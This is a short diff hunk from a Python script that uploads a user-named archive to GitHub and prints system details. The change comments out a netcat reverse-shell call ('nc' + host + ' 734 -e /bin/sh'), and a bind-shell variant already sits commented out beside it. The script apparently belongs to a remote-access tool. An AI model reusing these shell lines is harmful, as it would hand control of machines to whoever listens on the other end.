@@ -69,7 +69,7 @@ def run():
         archive=input()
         upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
-        os.system('nc' + iph+ ' 734 -e /bin/sh')
+        #os.system('nc' + iph+ ' 734 -e /bin/sh')
     elif "Windows" in platform.system():
         print('Windows: ', sysconfig.get_platform()) 
         print('Address ip: ', IPAddr)
